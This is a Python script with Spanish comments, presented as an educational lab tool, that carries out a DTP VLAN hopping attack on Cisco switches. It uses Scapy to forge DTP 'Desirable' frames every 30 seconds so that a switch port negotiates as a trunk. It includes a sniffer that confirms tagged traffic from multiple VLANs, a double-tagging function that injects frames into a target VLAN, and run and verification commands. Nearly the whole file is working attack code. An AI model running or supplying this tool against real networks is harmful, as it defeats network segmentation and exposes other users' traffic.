#!/usr/bin/env python3
"""
=============================================================
  DTP VLAN Hopping — Script educativo de laboratorio
=============================================================
  ADVERTENCIA: Solo para uso en entornos controlados con
  autorización explícita. Uso no autorizado es ilegal.

  Objetivo:
    Enviar tramas DTP falsas para que el switch Cisco
    negocie el puerto como TRUNK, permitiendo al atacante
    ver tráfico de TODAS las VLANs (VLAN Hopping).

  Requisitos:
    - Switch Cisco con DTP habilitado (dynamic auto o desirable)
    - Puerto del atacante conectado directamente al switch
    - pip install scapy

  Ejecución (como root):
    python3 dtp_vlan_hopping.py

  Verificación del éxito:
    tcpdump -i eth0 -e | grep "802.1Q"
    (deberías ver tráfico etiquetado de múltiples VLANs)
=============================================================
"""

import sys
import time
import signal
import struct
from scapy.all import (
    Ether, Dot3, LLC, sendp, get_if_hwaddr, conf, sniff
)
from scapy.contrib.dtp import DTP, DTPDomain, DTPStatus, DTPType, DTPNeighbor

# ─── Configuración ────────────────────────────────────────
IFACE       = "eth0"     # Interfaz conectada al switch (ajustar)
INTERVALO   = 30         # Segundos entre tramas DTP (el switch espera ~30s)
VLAN_TARGET = [10, 20, 30, 99]  # VLANs a las que queremos acceso

# MAC multicast DTP (destino fijo del protocolo)
DTP_MULTICAST = "01:00:0c:cc:cc:cc"


# ─── Construcción manual de trama DTP ─────────────────────
# Scapy incluye soporte DTP en scapy.contrib.dtp
# Si no está disponible, usamos construcción raw.

def build_dtp_frame_raw(src_mac: str) -> bytes:
    """
    Construye una trama DTP 'Desirable-NonISL' manualmente.
    Estructura: Ethernet 802.3 → LLC SNAP → DTP TLVs

    TLVs DTP:
      0x0001 → Domain (dominio vacío = acepta cualquier vecino)
      0x0002 → Status (0x83 = Trunk Desirable)
      0x0003 → Type   (0xa5 = 802.1Q)
      0x0004 → Neighbor (MAC del atacante)
    """
    src = bytes.fromhex(src_mac.replace(":", ""))
    dst = bytes.fromhex(DTP_MULTICAST.replace(":", ""))

    # LLC SNAP header
    llc_snap = (
        b'\xaa\xaa\x03'    # DSAP, SSAP, Control (SNAP)
        b'\x00\x00\x0c'    # OUI Cisco
        b'\x20\x04'        # PID DTP
    )

    # DTP version
    dtp_version = b'\x01'

    # TLV helper: type (2B) + length (2B) + value
    def tlv(t, v):
        return struct.pack(">HH", t, 4 + len(v)) + v

    domain_tlv   = tlv(0x0001, b'')          # dominio vacío
    status_tlv   = tlv(0x0002, b'\x83')      # Desirable
    type_tlv     = tlv(0x0003, b'\xa5')      # 802.1Q
    neighbor_tlv = tlv(0x0004, src)          # nuestra MAC

    dtp_payload = dtp_version + domain_tlv + status_tlv + type_tlv + neighbor_tlv

    # Encabezado Ethernet 802.3 (longitud, no EtherType)
    payload = llc_snap + dtp_payload
    length  = struct.pack(">H", len(payload))

    frame = dst + src + length + payload
    return frame


def send_dtp_frame(src_mac: str):
    """Envía la trama DTP raw directamente al socket."""
    from scapy.all import conf as scapy_conf
    frame_bytes = build_dtp_frame_raw(src_mac)
    sock = scapy_conf.L2socket(iface=IFACE)
    sock.send(frame_bytes)
    sock.close()


def send_dtp_scapy(src_mac: str):
    """
    Intenta enviar DTP usando el módulo contrib de Scapy.
    Fallback a raw si el módulo no está disponible.
    """
    try:
        pkt = (
            Ether(dst=DTP_MULTICAST, src=src_mac) /
            LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
            DTP(
                ver=1,
                tlvlist=[
                    DTPDomain(dtpdomain=b''),
                    DTPStatus(dtpstatus=b'\x83'),   # Desirable
                    DTPType(dtptype=b'\xa5'),        # 802.1Q
                    DTPNeighbor(neighbor=src_mac),
                ]
            )
        )
        sendp(pkt, iface=IFACE, verbose=False)
        return True
    except Exception:
        return False


# ─── Captura de tráfico 802.1Q (verificación) ─────────────

def vlan_sniffer(pkt):
    """
    Callback: detecta tramas 802.1Q etiquetadas,
    lo que confirma que el puerto ya negoció como trunk.
    """
    if pkt.haslayer("Dot1Q"):
        vlan_id = pkt["Dot1Q"].vlan
        src     = pkt["Ether"].src if pkt.haslayer("Ether") else "?"
        print(f"  [+] Tráfico VLAN {vlan_id:>4}  |  src={src}")


def start_vlan_monitor():
    """Escucha tramas 802.1Q en background para confirmar trunk activo."""
    print("[*] Monitoreando tráfico 802.1Q (confirma trunk activo)...")
    sniff(
        iface=IFACE,
        filter="ether proto 0x8100",   # 802.1Q ethertype
        prn=vlan_sniffer,
        store=0
    )


# ─── Fase 2: Double Tagging (opcional) ────────────────────
# Una vez en modo trunk, se puede hacer Double Tagging
# para saltar a una VLAN nativa diferente.

def send_double_tagged_frame(src_mac: str,
                              outer_vlan: int,
                              inner_vlan: int,
                              dst_ip: str):
    """
    Envía una trama con doble etiqueta 802.1Q.
    El switch elimina la etiqueta exterior (VLAN nativa)
    y reenvía con la etiqueta interior a la VLAN objetivo.

    Nota: Solo funciona hacia la víctima (unidireccional).
          La respuesta no vuelve al atacante directamente.
    """
    try:
        from scapy.all import IP, UDP, Raw, Dot1Q
        pkt = (
            Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
            Dot1Q(vlan=outer_vlan) /   # Etiqueta exterior (VLAN nativa del trunk)
            Dot1Q(vlan=inner_vlan) /   # Etiqueta interior (VLAN objetivo)
            IP(dst=dst_ip) /
            UDP(dport=9) /
            Raw(b"DTP-VLAN-HOPPING-LAB")
        )
        sendp(pkt, iface=IFACE, verbose=False)
        print(f"  [+] Double-tagged frame enviado → VLAN {inner_vlan} ({dst_ip})")
    except ImportError:
        print("  [!] Scapy no disponible para Double Tagging")


# ─── Main ──────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("  DTP VLAN Hopping Lab — Solo uso educativo autorizado")
    print("=" * 60)

    src_mac = get_if_hwaddr(IFACE)
    print(f"[*] Interfaz : {IFACE}")
    print(f"[*] MAC      : {src_mac}")
    print(f"[*] Objetivo : Negociar trunk con el switch\n")

    # Manejador Ctrl+C
    def shutdown(sig, frame):
        print("\n[!] Deteniendo. El puerto puede tardar en volver a access.")
        print("[!] En el switch: 'switchport mode access' para revertir.")
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    # Bucle principal: enviar DTP cada INTERVALO segundos
    ciclo = 1
    while True:
        print(f"[{ciclo}] Enviando trama DTP 'Desirable' → {DTP_MULTICAST}")

        # Intentar con Scapy contrib primero, luego raw
        ok = send_dtp_scapy(src_mac)
        if not ok:
            send_dtp_frame(src_mac)
            print("    (enviado en modo raw)")
        else:
            print("    (enviado via Scapy DTP contrib)")

        if ciclo == 1:
            print("\n[*] Esperando negociación del switch...")
            print("[*] Verificar con: tcpdump -i eth0 -e | grep '802.1Q'")
            print("[*] O con:         ip link show eth0 (buscar 'PROMISC')\n")

        time.sleep(INTERVALO)
        ciclo += 1


if __name__ == "__main__":
    if not sys.platform.startswith("linux"):
        print("[!] Diseñado para Linux.")
        sys.exit(1)
    if "--monitor" in sys.argv:
        # Modo solo monitoreo (sin enviar DTP)
        start_vlan_monitor()
    else:
        main()
